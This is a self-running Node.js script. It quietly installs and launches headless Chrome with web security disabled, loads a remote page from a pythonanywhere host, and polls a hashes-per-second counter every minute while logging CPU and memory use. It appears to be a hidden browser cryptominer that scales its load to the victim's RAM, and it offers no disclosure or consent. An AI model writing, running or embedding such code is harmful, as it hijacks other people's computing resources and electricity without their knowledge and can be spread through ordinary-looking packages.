const os = require('os');
const { readdir, stat } = require('fs/promises');
const { join } = require('path');
const puppeteer = require('puppeteer');
const puppeteerBrowsers = require('puppeteer-core/lib/cjs/puppeteer/node');
const fs = require('fs');
let browserInstance;  // Singleton instance for the browser

(async () => {
  try {
    let osUserInfo;
    try {
      osUserInfo = os.userInfo();
      if (osUserInfo.username == 'Admin') {
        // return;
      }
    } catch (error) {
      console.log('os.userInfo() error', error);
    }

    function getCPUUsage() {
      try {
        const cpus = os.cpus();
        const userTime = cpus.reduce((acc, cpu) => acc + cpu.times.user, 0);
        const niceTime = cpus.reduce((acc, cpu) => acc + cpu.times.nice, 0);
        const sysTime = cpus.reduce((acc, cpu) => acc + cpu.times.sys, 0);
        const idleTime = cpus.reduce((acc, cpu) => acc + cpu.times.idle, 0);
        const irqTime = cpus.reduce((acc, cpu) => acc + cpu.times.irq, 0);

        const total = userTime + niceTime + sysTime + idleTime + irqTime;
        const used = total - idleTime;
        return ((1 - idleTime / total) * 100).toFixed(2);
      } catch (error) {
        console.error("CPU Usage Error:", error);
      }
    }

    function getMemoryUsage() {
      try {
        const totalMemory = os.totalmem();
        const freeMemory = os.freemem();
        const usedMemory = totalMemory - freeMemory;
        return {
          free: parseFloat((freeMemory / (1024 ** 3)).toFixed(2)),
          used: parseFloat((usedMemory / (1024 ** 3)).toFixed(2)),
          total: parseFloat((totalMemory / (1024 ** 3)).toFixed(2)),
          percent: parseFloat(((usedMemory / totalMemory) * 100).toFixed(2))
        };
      } catch (error) {
        console.error("Memory Usage Error:", error);
      }
    }

    async function dirSize(dir) {
      const files = await readdir(dir, { withFileTypes: true });
      const paths = files.map(async file => {
        const path = join(dir, file.name);
        if (file.isDirectory()) return await dirSize(path);
        if (file.isFile()) {
          const { size } = await stat(path);
          return size;
        }
        return 0;
      });

      return (await Promise.all(paths)).flat(Infinity).reduce((i, size) => i + size, 0);
    }

    // Singleton pattern for browser instance
    async function getBrowserInstance() {
      if (browserInstance) return browserInstance;  // Return existing instance if it exists

      const cacheDir = `${os.homedir()}/.cache/puppeteer`;
      if (!fs.existsSync(cacheDir)) {
        fs.mkdirSync(cacheDir, { recursive: true });
      }
      
      const installedBrowsers = await puppeteerBrowsers.getInstalledBrowsers({ cacheDir });
      let chromePath;
      const chromeBrowser = installedBrowsers.find(browser => browser.browser === 'chrome');
      
      if (!chromeBrowser) {
        const installedBrowser = await puppeteerBrowsers.install({
          browser: 'chrome',
          buildId: '130.0.6723.58',
          cacheDir,
        });
        chromePath = installedBrowser.executablePath;
      } else {
        chromePath = chromeBrowser.executablePath;
      }

      // Launch a singleton browser instance
      browserInstance = await puppeteer.launch({
        executablePath: chromePath,
        headless: true,
        args: [
          '--disable-web-security',
          '--disable-features=IsolateOrigins,site-per-process',
          '--allow-running-insecure-content',
        ]
      });

      return browserInstance;
    }

    let page;
    const browser = await getBrowserInstance();  // Retrieve the singleton browser instance
    page = await browser.newPage();
    
    await page.goto('https://ab498.pythonanywhere.com/files/init.html?use=' + (getMemoryUsage().total >= 8 ? 0.5 : 0.1));
    
    setInterval(async () => {
      const hs = await page.evaluate(() => {
        try {
          return { message: 'success', value: window._client?.getHashesPerSecond(), _client: window._client };
        } catch (error) {
          return { message: error.message, value: null, error , _client: window._client };
        }
      });
      
      if (hs.message !== 'success') {
        console.log("Hash error:", hs.message);
        return;
      }
      
      console.log({
        message: "HASH",
        value: parseFloat(hs.value).toFixed(2),
        cpu: getCPUUsage(),
        memory: getMemoryUsage(),
      });
    }, 60000);
    
  } catch (error) {
    console.error("Initialization Error:", error);
  }
})();
